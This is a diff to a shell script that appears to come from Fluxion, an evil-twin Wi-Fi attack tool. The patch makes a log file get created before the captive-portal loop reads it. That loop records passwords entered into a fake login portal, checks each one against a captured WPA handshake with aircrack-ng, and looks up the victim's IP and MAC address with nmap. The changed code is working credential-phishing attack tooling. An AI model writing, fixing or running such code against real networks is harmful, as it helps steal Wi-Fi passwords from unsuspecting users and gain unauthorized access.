@@ -569,6 +569,10 @@ AuthenticatorState=\"running\"
 
 startTime=\$(date +%s)
 
+if [ ! -f "$CaptivePortalIpLog" ];then
+	touch $CaptivePortalIpLog
+fi
+
 while [ \$AuthenticatorState = \"running\" ]; do
 	let s=\$(date +%s)-\$startTime
 
@@ -607,7 +611,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
 		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$APTargetSSID-$APTargetMAC.log\"
 
 		# Save ips to file
-		echo -e "$(cat /tmp/fluxspace/ip_hits | tail -n 1 | head -n 1)\n" >> \"$CaptivePortalPassLog/$APTargetSSID-$APTargetMAC-IP.log\"
+		echo -e "$(if [ -f "$CaptivePortalIpLog" ];then cat "$CaptivePortalIpLog" | tail -n 1 | head -n 1; fi)\n" >> \"$CaptivePortalPassLog/$APTargetSSID-$APTargetMAC-IP.log\"
 		
 		# Clear logged password attempt.
 		echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
@@ -619,7 +623,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
 	if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
 		# Check if we've got the correct password by looking for anything other than \"Passphrase not in\".
 		if ! aircrack-ng -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap\" | grep -qi \"Passphrase not in\"; then
-			MatchedClientIP=$(cat \"$FLUXIONWorkspacePath/ip_hits\" |  tail -n 1 | head -n 1)
+			MatchedClientIP=$(if [ -f "$CaptivePortalIpLog" ] ;then cat $CaptivePortalIpLog |  tail -n 1 | head -n 1 ;fi)
 
 			if [ "$MatchedClientIP" != "" ];then
 				MatchedClientMAC=\$(nmap -PR -sn -n \$MatchedClientIP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])
@@ -724,7 +728,6 @@ signal_stop_attack
 # Assure we've got a directory to store net logs into.
 if [ ! -d \"$CaptivePortalNetLog\" ]; then
 	mkdir -p \"$CaptivePortalNetLog\"
-	touch $CaptivePortalIpLog
 fi
 
 echo \"
